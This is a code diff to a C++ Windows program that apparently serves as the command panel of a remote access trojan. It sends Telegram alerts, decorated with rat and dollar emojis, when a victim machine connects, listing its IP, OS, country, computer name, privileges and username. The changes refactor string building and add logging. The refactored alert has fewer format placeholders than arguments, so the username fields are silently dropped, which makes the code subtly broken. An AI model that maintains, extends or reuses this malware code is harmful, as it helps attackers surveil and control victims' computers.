@@ -8,6 +8,7 @@
 #include "countrycoords.h"
 #include "shell.h"
 #include <set>
+#include <format>
 
 HWND hwndList;
 HWND hwndButton;
@@ -196,11 +197,11 @@ void TelegramServerStatus(boolean online)
 
     if (!online)
     {
-        txtmsg_chars = acPoint + "[" + reddotEmoji + "]" + " SERVER CLOSED | OFFLINE " + "[" + reddotEmoji + "]";
+        txtmsg_chars = format("{} [{}] SERVER CLOSED | OFFLINE [{}]", acPoint, reddotEmoji, reddotEmoji);
     }
     else
     {
-        txtmsg_chars = acPoint + "[" + greendotEmoji + "]" + " SERVER ONLINE " + "[" + greendotEmoji + "]";
+        txtmsg_chars = format("{} [{}] SERVER ONLINE[{}]", acPoint, greendotEmoji, greendotEmoji);
     }
 
     const char* txtmsg_char = txtmsg_chars.c_str();
@@ -241,13 +242,13 @@ void TelegramServerStatus(boolean online)
 
                 // Handle the response as needed
                 if (msg->data.result == CURLE_OK) {
-                    // Handle successful response
-                    // ...
+                    // place holder
+                    cout << "CURLE STATUS: OK" << endl;
 
                 }
                 else {
-                    // Handle error response
-                    // ...
+                    // place holder
+                    cout << "CURL STATUS: FAILED" << endl;
                 }
 
                 // Remove the easy handle from the multi handle and clean it up
@@ -261,8 +262,8 @@ void TelegramServerStatus(boolean online)
         int numFds;
         int selectResult = curl_multi_wait(multiHandle4, NULL, 0, 1000, &numFds);
         if (selectResult != CURLM_OK) {
-            // Handle error
-            // ...
+            // place holder
+            cout << "CURLM STATUS: FAILED" << endl;
         }
     }
 
@@ -377,11 +378,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
                     if (bytesReceived < 0)
                     {
-
+                        cout << "Bytes Received some how went negative?" << endl;
                     }
                     else if (bytesReceived == 0)
                     {
-
+                        cout << "0 Bytes Receieved" << endl;
                     }
                     else
                     {
@@ -535,16 +536,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                         std::string pcnamePrint = " COMPUTER NAME : " + pcNameStr + "\n";
                         std::string userPrint = " USERNAME : " + pcUserStr + "\n";
                         std::string privilegesPrint = " PRIVILEGES : " + privilegesNewStr + "\n";
-                        std::string txtmsg = "chat_id=" + chat_id + "&text=" +
-                            ratEmoji + " " + dollarEmoji + " " + resulttitle() + " " + dollarEmoji + " " + ratEmoji + "\n" +
-                            greendotEmoji + " CONNECTED " + greendotEmoji + "\n" +
-                            IDemoji + userCount +
-                            IPemoji + ipPrint +
-                            OSemoji + osPrint +
-                            flagEmoji + countryPrint +
-                            pcnameEmoji + pcnamePrint +
-                            privilegesEmoji + privilegesPrint +
-                            userEmoji + userPrint;
+                        // this was erroring. Fixed it :)
+                        std::string txtmsg = format("chat_id={}&text={} {} {} {} {}\n{} CONNECTED {}\n{} {} {} {} {} {} {} {} {} {} {} {}",
+                            chat_id, ratEmoji, dollarEmoji, resulttitle(), dollarEmoji, ratEmoji, greendotEmoji, greendotEmoji,
+                            IDemoji, userCount, IPemoji, ipPrint, OSemoji, osPrint, flagEmoji, countryPrint, pcnameEmoji,
+                            pcnamePrint, privilegesEmoji, privilegesPrint, userEmoji, userPrint);
 
                         const char* txtmsg_char = txtmsg.c_str();
 
